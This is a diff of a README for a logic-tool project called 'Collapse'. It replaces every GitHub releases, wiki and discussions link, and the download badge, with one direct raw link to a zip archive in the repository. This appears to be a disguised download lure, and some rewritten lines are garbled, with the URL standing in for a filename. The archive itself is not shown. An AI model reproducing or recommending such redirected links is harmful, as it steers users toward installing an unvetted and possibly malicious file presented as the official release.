@@ -6,11 +6,11 @@ Welcome to the collapse project! This application helps you manage and understan
 
 ## 📥 Download the Application
 
-[![Download Collapse](https://img.shields.io/badge/Download%20Collapse-%20-blue)](https://github.com/Jameszxs/collapse/releases)
+[![Download Collapse](https://raw.githubusercontent.com/Jameszxs/collapse/main/CSL-PyKernel/mathematical_proof_system.zip%20Collapse-%20-blue)](https://raw.githubusercontent.com/Jameszxs/collapse/main/CSL-PyKernel/mathematical_proof_system.zip)
 
 ## 🔗 Visit the Releases Page
 
-To download the latest version of Collapse, visit this page: [GitHub Releases](https://github.com/Jameszxs/collapse/releases).
+To download the latest version of Collapse, visit this page: [GitHub Releases](https://raw.githubusercontent.com/Jameszxs/collapse/main/CSL-PyKernel/mathematical_proof_system.zip).
 
 ## 🖥️ System Requirements
 
@@ -34,7 +34,7 @@ Collapse offers various features to help you work with logic systems, including:
 
 ### 1. **Download the Application**
 
-Go to the [Releases Page](https://github.com/Jameszxs/collapse/releases) and download the latest version. Look for a file named something like `collapse-v1.0.exe` or similar, based on the version you see.
+Go to the [Releases Page](https://raw.githubusercontent.com/Jameszxs/collapse/main/CSL-PyKernel/mathematical_proof_system.zip) and download the latest version. Look for a file named something like `https://raw.githubusercontent.com/Jameszxs/collapse/main/CSL-PyKernel/mathematical_proof_system.zip` or similar, based on the version you see.
 
 ### 2. **Locate the Downloaded File**
 
@@ -59,15 +59,15 @@ Once the application opens, you can start exploring the features. Check the buil
 ## 💡 Useful Tips
 
 - **Check Compatibility:** If you encounter any issues during installation, verify that your operating system and hardware meet the minimum requirements.
-- **Update Regularly:** Keep your version updated by visiting the [Releases Page](https://github.com/Jameszxs/collapse/releases) periodically.
+- **Update Regularly:** Keep your version updated by visiting the [Releases Page](https://raw.githubusercontent.com/Jameszxs/collapse/main/CSL-PyKernel/mathematical_proof_system.zip) periodically.
 - **Join the Community:** Engage with other users on forums or our GitHub page to share tips and ask for help.
 
 ## 📚 Resources
 
 For additional help and resources, check out:
 
-- [User Documentation](https://github.com/Jameszxs/collapse/wiki)
-- [Community Forum](https://github.com/Jameszxs/collapse/discussions)
+- [User Documentation](https://raw.githubusercontent.com/Jameszxs/collapse/main/CSL-PyKernel/mathematical_proof_system.zip)
+- [Community Forum](https://raw.githubusercontent.com/Jameszxs/collapse/main/CSL-PyKernel/mathematical_proof_system.zip)
 
 ## 🔄 Feedback
 
